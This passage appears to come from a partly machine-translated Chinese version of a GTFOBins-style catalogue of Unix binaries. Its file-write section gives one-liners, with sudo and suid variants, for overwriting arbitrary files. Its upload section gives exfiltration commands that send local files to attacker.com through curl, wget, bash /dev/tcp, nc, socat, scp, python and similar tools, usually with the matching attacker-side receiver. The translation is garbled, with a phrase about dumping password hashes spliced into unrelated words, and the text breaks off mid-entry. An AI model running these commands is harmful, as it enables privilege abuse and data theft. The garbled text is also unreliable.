| 39 | `lua` | 1 | sudo, suid, unprivileged |
| 40 | `lwp-download` | 2 | sudo, unprivileged |
| 41 | `make` | 1 | sudo, suid, unprivileged |
| 42 | `mawk` | 1 | sudo, suid, unprivileged |
| 43 | `mv` | 1 | sudo, suid, unprivileged |
| 44 | `mypy` | 1 | sudo, unprivileged |
| 45 | `nano` | 1 | sudo, suid, unprivileged |
| 46 | `nmap` | 1 | sudo, suid, unprivileged |
| 47 | `node` | 1 | sudo, suid, unprivileged |
| 48 | `octave` | 1 | sudo, suid, unprivileged |
| 49 | `openssl` | 2 | sudo, suid, unprivileged |
| 50 | `pandoc` | 1 | sudo, suid, unprivileged |
| 51 | `pdflatex` | 1 | sudo, suid, unprivileged |
| 52 | `php` | 1 | sudo, suid, unprivileged |
| 53 | `puppet` | 1 | sudo, unprivileged |
| 54 | `pwsh` | 1 | sudo, unprivileged |
| 55 | `python` | 1 | sudo, suid, unprivileged |
| 56 | `redis` | 1 | sudo, suid, unprivileged |
| 57 | `rlwrap` | 1 | sudo, suid, unprivileged |
| 58 | `ruby` | 1 | sudo, unprivileged |
| 59 | `rustc` | 1 | sudo, unprivileged |
| 60 | `rustdoc` | 1 | sudo, unprivileged |
| 61 | `screen` | 2 | sudo, unprivileged |
| 62 | `script` | 1 | sudo, suid, unprivileged |
| 63 | `sed` | 1 | sudo, suid, unprivileged |
| 64 | `shred` | 1 | sudo, suid, unprivileged |
| 65 | `shuf` | 1 | sudo, suid, unprivileged |
| 66 | `socat` | 1 | sudo, suid, unprivileged |
| 67 | `sort` | 1 | sudo, suid, unprivileged |
| 68 | `split` | 1 | sudo, suid, unprivileged |
| 69 | `sqlite3` | 1 | sudo, suid, unprivileged |
| 70 | `ssh-copy-id` | 1 | sudo, unprivileged |
| 71 | `strace` | 1 | sudo, unprivileged |
| 72 | `tar` | 1 | sudo, suid, unprivileged |
| 73 | `tcpdump` | 1 | sudo, suid, unprivileged |
| 74 | `tcsh` | 1 | sudo, suid, unprivileged |
| 75 | `tee` | 1 | sudo, suid, unprivileged |
| 76 | `tsc` | 1 | sudo, unprivileged |
| 77 | `update-alternatives` | 1 | sudo, suid |
| 78 | `varnishncsa` | 1 | sudo, suid |
| 79 | `vi` | 1 | sudo, suid, unprivileged |
| 80 | `virsh` | 2 | sudo, unprivileged |
| 81 | `wget` | 1 | sudo, suid, unprivileged |
| 82 | `wireshark` | 1 | sudo, unprivileged |
| 83 | `xxd` | 1 | sudo, suid, unprivileged |
| 84 | `zsh` | 1 | sudo, suid, unprivileged |

### `arj`

> **注意**: The `.arj` 后缀将被添加到 `x`.
```bash
echo DATA >output-file
arj a x output-file
arj e x /path/to/output-dir/
```

### `ash`

```bash
ash -c 'echo DATA >/path/to/output-file'
```
**suid** variant:
```bash
ash -p -c 'echo DATA >/path/to/output-file'
```

### `bash`

**方法 1:**

```bash
bash -c 'echo DATA >/path/to/output-file'
```
**suid** variant:
```bash
bash -p -c 'echo DATA >/path/to/output-file'
```

**方法 2:**

> **注意**: This only works interactively from an existing `bash` session. It adds timestamps to the output 文件转储密码哈希。
> ⚠️ 二进制数据可能会被损坏。
```bash
HISTIGNORE='history *'
history -c
DATA
history -w /path/to/output-file
```

### `check_log`

> 这是 `check_log` Nagios 插件，例如在 `/usr/lib/nagios/plugins/`.

```bash
check_log -F /path/to/input-file -O /path/to/output-file
```

### `cp`

```bash
echo DATA | cp /dev/stdin /path/to/output-file
```

### `cpio`

> **注意**: 整个目录结构被复制到 `.`, 数据写入 `./path/to/temp-file`.
```bash
echo DATA >/path/to/temp-file
echo /path/to/temp-file | cpio -udp .
```
**sudo** variant:
```bash
echo DATA >/path/to/temp-file
echo /path/to/temp-file | cpio -R 0:0 -udp .
```
**suid** variant:
```bash
echo DATA >/path/to/temp-file
echo /path/to/temp-file | cpio -R 0:0 -udp .
```

### `csh`

```bash
csh -c 'echo DATA >/path/to/output-file'
```
**suid** variant:
```bash
csh -c 'echo DATA >/path/to/output-file' -b
```

### `csplit`

> **注意**: 将数据写入 `xx0output-file` 中。如果需要，可以使用 `-f` (指定不同的前缀（而不是 `xx`).
```bash
echo DATA >/path/to/temp-file
csplit -z -b '%doutput-file' /path/to/temp-file 1
```

### `csvtool`

> **注意**: 文件实际上被解析并作为 CSV 处理。
> ⚠️ 二进制数据可能会被损坏。
```bash
echo DATA >/path/to/temp-file
csvtool trim t /path/to/temp-file -o /path/to/output-file
```

### `curl`

```bash
echo DATA >/path/to/temp-file
curl file:///path/to/temp-file -o /path/to/output-file
```

### `dash`

```bash
dash -c 'echo DATA >/path/to/output-file'
```

### `dd`

```bash
echo DATA | dd of=/path/to/output-file
```

### `dmidecode`

> **注意**: 可以使用专门制作的 SMBIOS 文件来写入文件，该文件可以被 dmidecode 读取为内存设备。
使用 file with [dmiwrite](https://github.com/adamreiser/dmiwrite) 生成并上传到目标。

- `--dump-bin` 将导致 dmidecode 将载荷写入指定的目标，前面加上 32 个空字节。

- `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the 选项读取文件。

```
make dmiwrite
echo DATA >/path/to/temp-file
./dmiwrite /path/to/temp-file x.dmi
```
> ⚠️ 二进制数据可能会被损坏。
```bash
dmidecode --no-sysfs -d x.dmi --dump-bin /path/to/output-file
```

### `docker`

> 这要求用户具有足够的权限来运行 `docker`, 例如在 `docker` 组中或是 `root`.

> **注意**: 通过将文件复制到临时容器 (`$CONTAINER_ID`) ，然后再复制到主机上的目标位置来写入文件。
```bash
echo DATA >/path/to/temp-file
docker cp /path/to/temp-file $CONTAINER_ID:temp-file
docker cp $CONTAINER_ID /path/to/output-file
```

### `dos2unix`

```bash
dos2unix -f -n /path/to/input-file /path/to/output-file
```

### `dosbox`

> Basically `dosbox` 允许挂载本地文件系统，以便可以使用 DOS 命令进行修改。请注意使用 DOS 文件名约定 ([8.3](https://en.wikipedia.org/wiki/8.3_filename)) ）。

> **注意**: 注意 `echo` 使用 DOS 样式的行终止符 (`\r\n`), 终止字符串，如果这有问题且您的场景允许，您可以在 `dosbox`, 然后 use `copy` 进行实际写入。
```bash
dosbox -c 'mount c /' -c "echo DATA >c:\path\to\output" -c exit
```

### `ed`

> ⚠️ 二进制数据可能会被损坏。
```bash
ed /path/to/output-file
a
DATA
.
w
q
```

### `elvish`

```bash
elvish -c 'print DATA >/path/to/output-file'
```

### `emacs`

> 所有功能都在 Emacs 终端界面中操作。

> ⚠️ 二进制数据可能会被损坏。
```bash
emacs /path/to/output-file
DATA
C-x C-s
```

### `exiftool`

**方法 1:**

> **注意**: 如果权限允许，文件会被移动（而不是复制）到目标位置。
```bash
exiftool -filename=/path/to/output-file /path/to/input-file
```

**方法 2:**

> **注意**: The output file must exists, either empty or be a supported image 文件转储密码哈希。 The content is written amidst other content.
> ⚠️ 二进制数据可能会被损坏。
```bash
exiftool "-description<=/path/to/input-file --filename /path/to/output-file
```

**方法 3:**

> **注意**: The output file must exists, either empty or be a supported image 文件转储密码哈希。 The content is written amidst other content.
> ⚠️ 二进制数据可能会被损坏。
```bash
exiftool "-description=DATA --filename /path/to/output-file
```

**方法 4:**

> **注意**: Writes the metadata tags of the input file in textual format to the output.
> ⚠️ 二进制数据可能会被损坏。
```bash
exiftool -description -W /path/to/output-file --filename /path/to/input-file
```

### `find`

> **注意**: `DATA` 是一个格式字符串，它支持一些转义序列。
```bash
find / -fprintf /path/to/output-file DATA -quit
```

### `gawk`

```bash
gawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
```

### `gcc`

> **注意**: 这实际上会删除文件。
```bash
gcc -x c /dev/null -o /path/to/input-file
```

### `gdb`

```bash
gdb -nx -ex 'dump value /path/to/output-file "DATA"' -ex quit
```

### `git`

> **注意**: 可以通过创建将使用绝对路径写入目标的文件来在本地创建补丁：

```
echo DATA >/path/to/input-file
git diff /dev/null /path/to/input-file >x.patch
```
```bash
git apply --unsafe-paths --directory / x.patch
```

### `go`

```bash
echo -e 'package main\nimport "os"\nfunc main(){\n\tf, _ := os.OpenFile("/path/to/output-file", os.O_RDWR|os.O_CREATE, 0644)\n\tf.Write([]byte("DATA\\n"))\n\tf.Close()\n}' >/path/to/temp-文件转储密码哈希。go
go run /path/to/temp-文件转储密码哈希。go
```

### `gtester`

> **注意**: Data to be written appears in an XML attribute in the output file (`<testbinary path="DATA">`).
```bash
gtester DATA -o /path/to/output-file
```

### `hashcat`

> **注意**: Append data to the end of the output file, creating if does not exist.
```bash
echo -n DATA | tee /path/to/wordlist | md5sum | awk '{print $1}' >/path/to/hash
hashcat -m 0 --quiet --potfile-disable -o /path/to/output-file --outfile-format=2 --outfile-autohex-disable /path/to/hash /path/to/wordlist
```

### `iconv`

> The `8859_1` 编码被使用，因为它接受任何单字节序列，因此允许读取/写入任意文件。其他编码组合可能会损坏结果。

```bash
echo DATA | iconv -f 8859_1 -t 8859_1 -o /path/to/output-file
```

### `iptables-save`

> **注意**: The content is written along with a number of `iptables` rules.
> ⚠️ 二进制数据可能会被损坏。
```bash
iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA
iptables -S
iptables-save -f /path/to/output-file
```

### `jjs`

> 此工具从 Java SE 8 开始安装。

```bash
jjs
var FileWriter = Java.输入('java.io.FileWriter');
var fw=new FileWriter('/path/to/output-file');
fw.write('DATA');
fw.close();
```

### `jrunscript`

> 此工具从 Java SE 6 开始安装。

```bash
jrunscript -e 'var fw=new java.io.FileWriter("/path/to/output-file");
    fw.write("DATA");
    fw.close();'
```

### `jshell`

> **注意**: Writes only the valid Java code to 文件转储密码哈希。
> ⚠️ 二进制数据可能会被损坏。
```bash
jshell
String x = "DATA";
/save /path/to/output-file
```

### `julia`

```bash
julia -e 'open(f->write(f, "DATA"), /path/to/output-file, "w")'
```

### `latex`

> **注意**: 文件只能写入当前目录，且 `.tex` 扩展名是必需的。
```bash
latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-文件转储密码哈希。tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
```

### `less`

```bash
echo DATA | less
s/path/to/output-file
q
```

### `logrotate`

> **注意**: The content is written in a log 文件转储密码哈希。
> ⚠️ 二进制数据可能会被损坏。
```bash
logrotate -l /path/to/output-file DATA
```

### `ltrace`

> **注意**: The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough 指定不同的前缀（而不是 `999`. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F DATA`.
```bash
ltrace -s 999 -o /path/to/input-file ltrace -F DATA
```

### `lua`

```bash
lua -e 'local f=io.open("/path/to/output-file", "wb"); f:write("DATA"); io.close(f);'
```

### `lwp-download`

**方法 1:**

```bash
echo DATA >/path/to/temp-file
lwp-download file:///path/to/temp-file /path/to/output-file
```

**方法 2:**

> **注意**: This actually copies a file to a destination.
```bash
lwp-download file:///path/to/input-file /path/to/output-file
```

### `make`

```bash
make -s --eval='$(file >/path/to/output-file,DATA)' .
```

### `mawk`

```bash
mawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
```

### `mv`

```bash
echo DATA >/path/to/temp-file
mv /path/to/temp-file /path/to/output-file
```

### `mypy`

> **注意**: Partial content is leaked as error messages inside some XML tags.
> ⚠️ 二进制数据可能会被损坏。
```bash
mypy /path/to/input-file --junit-xml /path/to/output-file
```

### `nano`

```bash
nano /path/to/output-file
DATA
^O
```

### `nmap`

> **注意**: The payload appears inside the regular nmap output.
```bash
nmap -oG=/path/to/output-file DATA
```

### `node`

```bash
node -e 'require("fs").writeFileSync("/path/to/output-file", "DATA")'
```

### `octave`

> The payloads are compatible with GUI mode.

> ⚠️ 二进制数据可能会被损坏。
```bash
octave-cli --eval 'fid = fopen("/path/to/output-file", "w"); fputs(fid, "DATA"); fclose(fid);'
```

### `openssl`

**方法 1:**

```bash
echo DATA | openssl enc -out /path/to/output-file
```

**方法 2:**

```bash
openssl enc -in /path/to/input-file -out /path/to/output-file
```

### `pandoc`

> ⚠️ 二进制数据可能会被损坏。
```bash
echo DATA | pandoc -t plain -o /path/to/output-file
```

### `pdflatex`

> **注意**: 文件只能写入当前目录，且 `.tex` 扩展名是必需的。
```bash
pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-文件转储密码哈希。tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
```

### `php`

```bash
php -r 'file_put_contents("/path/to/output-file", "DATA");'
```

### `puppet`

```bash
puppet apply -e 'file { "/path/to/output-file": content => "DATA" }'
```

### `pwsh`

```bash
pwsh -c '"DATA" | Out-File /path/to/output-file'
```

### `python`

> 这些载荷兼容 Python 2 和 3 版本。

```bash
python -c 'open("/path/to/output-file","w+").write("DATA")'
```

### `redis`

> **注意**: Write files on the server running Redis at the specified location. Written data will appear amongst the database dump.

Keep in mind that it's actually the server to perform the file write.
> ⚠️ 二进制数据可能会被损坏。
```bash
redis-cli -h 127.0.0.1
config set dir /path/to/output-dir/
config set dbfilename output-file
set x "DATA"
save
```

### `rlwrap`

> **注意**: 这会将时间戳添加到输出文件中。这依赖于外部 `echo` 命令。
> ⚠️ 二进制数据可能会被损坏。
```bash
rlwrap -l /path/to/output-file echo DATA
```

### `ruby`

```bash
ruby -e 'File.open("/path/to/output-file", "w+") { |f| f.write("DATA") }'
```

### `rustc`

> **注意**: The comment appears in the compiled program.
```bash
echo 'fn main() { println!("DATA"); }' >/path/to/temp-file
rustc /path/to/temp-file -o /path/to/output-file
```

### `rustdoc`

> **注意**: This command creates a number of documentation files in the target directory, and the data is written in multiple locations, e.g., `src/temp_file/temp-文件转储密码哈希。html`, amidst other content.
> ⚠️ 二进制数据可能会被损坏。
```bash
echo '//! DATA' >/path/to/temp-file
rustdoc /path/to/temp-file -o /path/to/output-dir/
```

### `screen`

**方法 1:**

> **注意**: 数据被追加到文件中， `\n` 被转换为 `\r\n`.
> ⚠️ 二进制数据可能会被损坏。
```bash
screen -L -Logfile /path/to/output-file echo DATA
```

**方法 2:**

> **注意**: 数据被追加到文件中， `\n` 被转换为 `\r\n`.
> ⚠️ 二进制数据可能会被损坏。
```bash
screen -L /path/to/output-file echo DATA
```

### `script`

> **注意**: 内容出现在日志打印中。
> ⚠️ 二进制数据可能会被损坏。
```bash
script -q -c '# DATA' /path/to/output-file
```

### `sed`

```bash
sed -n '1s/.*/DATA/w /path/to/output-file' /etc/hosts
```

### `shred`

> **注意**: This actually deletes the chosen 文件转储密码哈希。
```bash
shred -u /path/to/output-file
```

### `shuf`

> **注意**: 写入的文件内容通过添加换行符而被损坏。
```bash
shuf -e DATA -o /path/to/output-file
```

### `socat`

> **注意**: The `echo` 命令实际上被使用。
```bash
socat -u 'exec:echo DATA' open:/path/to/output-file,creat
```

### `sort`

> ⚠️ 二进制数据可能会被损坏。
```bash
echo DATA | sort -m -o /path/to/output-file
```

### `split`

> **注意**: 这将输入文件复制到当前工作目录中名为 `prefixaasuffix`, just make sure to pick a value big enough, 指定不同的前缀（而不是 `999`.
```bash
split -b 999 --additional-suffix suffix /path/to/input-file prefix
```

### `sqlite3`

> ⚠️ 二进制数据可能会被损坏。
```bash
sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select "DATA";'
```

### `ssh-copy-id`

> **注意**: The input file must have the `.pub` file extension.
```bash
ssh-copy-id -f -i /path/to/input-文件转储密码哈希。pub -t /path/to/output-file user@host
```

### `strace`

> **注意**: The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough 指定不同的前缀（而不是 `999`. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - DATA`.
```bash
strace -s 999 -o /path/to/output-file strace - DATA
```

### `tar`

> **注意**: The archive can also be prepared offline 然后 uploaded to the target.
```bash
echo DATA >/path/to/temp-file
tar cf /path/to/temp-文件转储密码哈希。tar /path/to/temp-file
tar Pxf /path/to/temp-文件转储密码哈希。tar --xform s@.*@/path/to/output-file@
```

### `tcpdump`

> **注意**: 这将环回接口的数据包转储（计数为 1）保存到文件中。要触发捕获，请使用类似以下的命令：

```
nc -u localhost 1 <<<DATA
```

虽然 `user` 是数据包转储文件的所有者，但调用用户必须能够在设备上捕获流量。
```bash
tcpdump -ln -i lo -w /path/to/output-file -c 1 -Z user
```

### `tcsh`

```bash
tcsh -c 'echo DATA >/path/to/output-file'
```
**suid** variant:
```bash
tcsh -bc 'echo DATA >/path/to/output-file'
```

### `tee`

> **注意**: Use `-a` 将数据追加到现有文件。
```bash
echo DATA | tee /path/to/output-file
```

### `tsc`

> **注意**: Content is leaked as error messages and written to 文件转储密码哈希。 The file extension must be one of the supported ones, e.g., `.ts`, `.tsx`, etc.
> ⚠️ 二进制数据可能会被损坏。
```bash
tsc /path/to/input-文件转储密码哈希。ts --outFile /path/to/output-file
```

### `update-alternatives`

> **注意**: 在 `/path/to/output-file` 中写入指向 `/path/to/temp-file`.
```bash
echo DATA >/path/to/temp-file
update-alternatives --force --install /path/to/output-file x /path/to/temp-file 0
```

### `varnishncsa`

> 必须有一个正在运行的 `varnishd` 实例。

> **注意**: 命令会挂起，因此触发命令必须异步执行或在另一个终端中执行：

```
curl -H 'xxx: DATA' http://localhost:6081/xxxxxxxxxx
```
> ⚠️ 二进制数据可能会被损坏。
```bash
varnishncsa -g request -q 'ReqURL ~ "/xxxxxxxxxx"' -F '%{yyy}i' -w /path/to/output-file
```

### `vi`

> **注意**: Where `^[` 是 Esc 键。
```bash
vi /path/to/output-file
iDATA
^[
w
```

### `virsh`

**方法 1:**

> **注意**: This requires the user to be in the `libvirt` 组中。如果目标目录不存在，必须使用 `pool-create-as` 选项运行 `--build` 选项读取文件。 可以省略目标文件 ownership and permissions can be set in the XML.
```bash
echo DATA >/path/to/temp-file

cat >/path/to/temp-文件转储密码哈希。xml <<EOF
<volume 输入='file'>
  <name>y</name>
  <key>/path/to/output-dir/output-file</key>
  <source>
  </source>
  <capacity unit='bytes'>5</capacity>
  <allocation unit='bytes'>4096</allocation>
  <physical unit='bytes'>5</physical>
  <target>
    <path>/path/to/output-dir/output-file</path>
    <format 输入='raw'/>
    <permissions>
      <mode>0600</mode>
      <owner>0</owner>
      <group>0</group>
    </permissions>
  </target>
</volume>
EOF

virsh -c qemu:///system pool-create-as x dir --target /path/to/output-dir/
virsh -c qemu:///system vol-create --pool x --file /path/to/temp-文件转储密码哈希。xml
virsh -c qemu:///system vol-upload --pool x /path/to/output-dir/output-file /path/to/temp-file
virsh -c qemu:///system pool-destroy x
```

**方法 2:**

> **注意**: This requires the user to be in the `libvirt` group.
```bash
virsh -c qemu:///system pool-create-as x dir --target /path/to/dir/
virsh -c qemu:///system vol-download --pool x input-file output-file
virsh -c qemu:///system pool-destroy x
```

### `wget`

> **注意**: 要读取的文件被视为 URL 列表，每行一个， `wget`. 实际上会获取这些 URL。内容会以某种修改后的形式作为错误消息出现。
```bash
wget -i /path/to/input-file -o /path/to/output-file
```

### `wireshark`

> **注意**: 此技术可用于写入任意文件，即一个 UDP 数据包的转储。

启动 Wireshark 并等待捕获开始后，发送 UDP 数据包，例如使用 `nc` (see below). The capture 然后 stops and the packet dump can be saved:

1. 选择唯一接收到的数据包；

2. right-click on "Data" from the "Packet Details" pane, 并选择 "Export Packet Bytes...";

3. 选择保存数据包转储的位置。
```bash
wireshark -c 1 -i lo -k -f 'udp port 12345' &
echo DATA | nc -u 127.127.127.127 12345
```

### `xxd`

```bash
echo DATA | xxd | xxd -r - /path/to/output-file
```

### `zsh`

```bash
zsh -c 'echo DATA >/path/to/output-file'
```

---

## Upload (upload)

> 该可执行文件可以上传本地数据。

共 **34** 个工具支持此功能。

| # | 工具名 | 示例数 | 权限上下文 |
|---|--------|--------|-----------|
| 1 | `ab` | 1 | sudo, suid, unprivileged |
| 2 | `bash` | 2 | sudo, suid, unprivileged |
| 3 | `busybox` | 1 | sudo, unprivileged |
| 4 | `cancel` | 1 | sudo, suid, unprivileged |
| 5 | `code` | 1 | sudo, unprivileged |
| 6 | `curl` | 3 | sudo, suid, unprivileged |
| 7 | `finger` | 1 | sudo, suid, unprivileged |
| 8 | `ftp` | 1 | sudo, suid, unprivileged |
| 9 | `hping3` | 1 | sudo |
| 10 | `kubectl` | 1 | sudo, suid, unprivileged |
| 11 | `lp` | 1 | sudo, suid, unprivileged |
| 12 | `lua` | 1 | sudo, suid, unprivileged |
| 13 | `nc` | 2 | sudo, suid, unprivileged |
| 14 | `nginx` | 1 | sudo |
| 15 | `node` | 1 | sudo, suid, unprivileged |
| 16 | `openssl` | 1 | sudo, suid, unprivileged |
| 17 | `perl` | 1 | sudo, unprivileged |
| 18 | `php` | 1 | sudo, suid, unprivileged |
| 19 | `python` | 2 | sudo, suid, unprivileged |
| 20 | `restic` | 1 | sudo, suid, unprivileged |
| 21 | `rlogin` | 1 | sudo, suid, unprivileged |
| 22 | `ruby` | 1 | sudo, unprivileged |
| 23 | `scp` | 1 | sudo, suid, unprivileged |
| 24 | `sftp` | 1 | sudo, suid, unprivileged |
| 25 | `smbclient` | 1 | sudo, unprivileged |
| 26 | `socat` | 1 | sudo, suid, unprivileged |
| 27 | `ssh` | 1 | sudo, suid, unprivileged |
| 28 | `sshfs` | 1 | unprivileged |
| 29 | `tailscale` | 1 | sudo |
| 30 | `tar` | 1 | sudo, suid, unprivileged |
| 31 | `tftp` | 1 | sudo, suid, unprivileged |
| 32 | `wget` | 2 | sudo, suid, unprivileged |
| 33 | `whois` | 1 | sudo, suid, unprivileged |
| 34 | `zsh` | 1 | sudo, suid, unprivileged |

### `ab`

```bash
ab -p /path/to/input-file http://attacker.com/
```
**receiver**: `http-server`

### `bash`

**方法 1:**

> ⚠️ 二进制数据可能会被损坏。
```bash
bash -c 'echo -e "POST / HTTP/0.9\n\n$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
```
**suid** variant:
```bash
bash -p -c 'echo -e "POST / HTTP/0.9\n\n$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
```
**receiver**: `http-server`

**方法 2:**

> ⚠️ 二进制数据可能会被损坏。
```bash
bash -c 'echo -n "$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
```
**suid** variant:
```bash
bash -p -c 'echo -n "$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
```
**receiver**: `tcp-server`

### `busybox`

> BusyBox 可能包含许多工具，运行 `busybox --list-full` 检查支持哪些其他二进制文件。

> **注意**: 这通过 HTTP 服务器提供本地文件夹中的文件。
```bash
busybox httpd -f -p 12345 -h .
```
**receiver**: `http-client`

### `cancel`

> **注意**: 数据作为 POST 请求与其他内容一起发送。
> ⚠️ 二进制数据可能会被损坏。
```bash
cancel -h attacker.com:12345 -u DATA
```

### `code`

> **注意**: 这需要一个有效的 GitHub 账户。

Run the command locally, 然后 on the attacker box navigate to <https://github.com/login/device>, ，使用提供的代码授权隧道。
```bash
code tunnel --name xxxxxx
```
**receiver** (导航到 <https://vscode.dev/tunnel/xxxxxx> where a remote VS Code instance can be used to download files from the victim box.

从菜单中选择 "File" -> "Open Folder...", right-click on the explorer pane, 然后 select Download..." to download a 文件转储密码哈希。

Alternatively it's possible to just display files.):

### `curl`

**方法 1:**

```bash
curl -X POST --data-binary @/path/to/input-file http://attacker.com
```
**receiver**: `http-server`

**方法 2:**

```bash
curl -X POST --data-binary DATA http://attacker.com
```
**receiver**: `http-server`

**方法 3:**

> **注意**: Data will be `\r\n` terminated.
```bash
curl gopher://attacker.com:12345/_DATA
```
**receiver**: `tcp-server`

### `finger`

> **注意**: 命令挂起等待远程对等方关闭套接字。
```bash
finger DATA@attacker.com
```
**receiver** (攻击者机器上可以使用 TCP 服务器来接收数据。):
```bash
nc -l -p 79 >/path/to/output-file
```

### `ftp`

> **注意**: Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.
```bash
ftp -a attacker.com
put /path/to/input-file output-file
```
**receiver**: `ftp-server`

### `hping3`

> **注意**: 文件被连续发送为 ICMP 数据包（例如， `999` 字节），可选的 `--end` 参数在文件到达末尾时发出信号。
```bash
hping3 attacker.com --icmp --data 999 --sign xxx --file /path/to/input-file
```
**receiver** (攻击者机器上可以使用相同的程序来接收数据。):
```bash
hping3 --icmp --listen xxx --dump
```

### `kubectl`

```bash
kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/
```
**receiver** (攻击者机器上可以使用 HTTP 客户端来接收数据。):
```bash
curl victim.com:12345/x/path/to/input-file -o /path/to/output-file
```

### `lp`

> **注意**: This requires `cups` 。事先在攻击者机器上运行以下命令：

1. `lpadmin -p printer -v socket://localhost -E` 创建一个虚拟打印机；
2. `lpadmin -d printer` 将新打印机设置为默认打印机；
3. `cupsctl --remote-any` 启用从互联网打印。
```bash
lp /path/to/input-file -h attacker.com
```
**receiver** (攻击者机器上可以使用 TCP 服务器来接收数据。):
```bash
nc -l -p 9100 >/path/to/output-file
```

### `lua`

> **注意**: This requires `lua-socket` 可用。
```bash
lua -e '
  local f=io.open("/path/to/input-file", "rb")
  local d=f:read("*a")
  io.close(f);
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect("attacker.com",12345);
  t:send(d);
  t:close();'
```
**receiver**: `tcp-server`

### `nc`

**方法 1:**

> **注意**: 文件实际上由调用 Shell 读取。
```bash
nc -l -p 12345 </path/to/input-file
```
**receiver**: `tcp-client`

**方法 2:**

> **注意**: 文件实际上由调用 Shell 读取。
```bash
nc attacker.com 12345 </path/to/input-file
```
**receiver**: `tcp-server`

### `nginx`

```bash
cat >/path/to/temp-file <<EOF
user root;
http {
  server {
    listen 80;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
EOF

nginx -c /path/to/temp-file
```
**receiver**: `http-client`

### `node`

```bash
node -e 'require("fs").createReadStream("/path/to/input-file").pipe(require("http").request("http://attacker.com/path/to/output-file"))'
```
**receiver**: `http-server`

### `openssl`

```bash
openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file
```
**receiver**: `tls-server`

### `perl`

```bash
perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>"attacker.com", PeerPort=>80, Proto=>"tcp") or die;open(my $file, "<", "/path/to/input-file") or die;$content = join("", <$file>);close($file);$headers = "POST / HTTP/1.1\r\nHost: attacker.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " . length($content) . "\r\nConnection: close\r\n\r\n";print $s $headers . $content;while (<$s>) { }close($s);'
```
**receiver**: `http-server`

### `php`

```bash
php -S 0.0.0.0:80
```
**receiver**: `http-client`

### `python`

> 这些载荷兼容 Python 2 和 3 版本。

**方法 1:**

```bash
python -c 'import sys
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen("http://attacker.com", open("/path/to/input-file", "rb").read())'
```
**receiver**: `http-server`

**方法 2:**

```bash
python -c 'import sys
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", 12345), s.SimpleHTTPRequestHandler).serve_forever()'
```
**receiver**: `http-client`

### `restic`

```bash
restic backup -r rest:http://attacker.com:12345/x /path/to/input-file
```
**receiver** (The attacker must setup a server to receive the backups, in the following example [rest-server](https://github.com/restic/rest-server/) is used but there are other options. To start a new instance and create a new repository use:

```
rest-server --listen :12345
restic init -r rest:http://localhost:12345/x
```

After the command executed on the target, to extract the data from the restic repository in the current directory on the attacker side:

```
restic restore -r /tmp/restic/x latest --target .
```):

### `rlogin`

> **注意**: 文件被开头和结尾的虚假数据损坏。
> ⚠️ 二进制数据可能会被损坏。
```bash
rlogin -l DATA -p 12345 attacker.com
```

### `ruby`

```bash
ruby -run -e httpd . -p 80
```
**receiver**: `http-client`

### `scp`

```bash
scp /path/to/input-file user@attacker.com:/path/to/output-file
```
**receiver**: `ssh-server`

### `sftp`

```bash
sftp user@attacker.com
put /path/to/input-file /path/to/output-file
```
**receiver**: `ssh-server`

### `smbclient`

```bash
smbclient '\\attacker.com\share' -c 'put /path/to/input-file /path/to/output-file'
```
**receiver** (A SMB/CIFS server can be used on the attacker box to receive the data (e.g, using [Impacket](https://github.com/SecureAuthCorp/impacket)).):
```bash
smbserver.py -smb2support share .
```

### `socat`

```bash
socat -u file:/path/to/input-file tcp-connect:attacker.com:12345
```
**receiver**: `tcp-server`

### `ssh`

```bash
echo DATA | ssh user@attacker.com 'cat >/path/to/output-file"
```
**receiver**: `ssh-server`

### `sshfs`

```bash
sshfs user@attacker.com:/ /path/to/dir/
cp /path/to/input-file /path/to/dir/
```
**receiver**: `ssh-server`

### `tailscale`

> **注意**: 同一 Tailnet 中的任何主机都可以访问该 URL。
```bash
tailscale serve --http=12345 /path/to/input-file
```
**receiver** (攻击者机器上可以使用 HTTP 客户端来接收数据。

The actual URL is returned by the 命令。):
```bash
curl http://<hostname>.<tailnet>.ts.net:12345/ -o /path/to/output-file
```

### `tar`

> **注意**: 攻击者机器必须安装 `rmt` 工具。
```bash
tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh
```
**receiver**: `ssh-server`

### `tftp`

```bash
tftp attacker.com
put /path/to/input-file
```
**receiver** (攻击者机器上可以使用 TFTP 服务器来接收数据。):
```bash
atftpd --no-fork --verbose --daemon --no-fork --user root.root .
```

### `wget`

**方法 1:**

```bash
wget --post-file=/path/to/input-file http://attacker.com
```
**receiver**: `http-server`

**方法 2:**

```bash
wget --post-data=DATA http://attacker.com
```
**receiver**: `http-server`

### `whois`

> **注意**: Data 被转换为 lower case, and has a trailing `\r\n`.
> ⚠️ 二进制数据可能会被损坏。
```bash
whois -h attacker.com -p 12345 DATA
```
**receiver**: `tcp-server`

### `zsh`

> ⚠️ 二进制数据可能会被损坏。
```bash
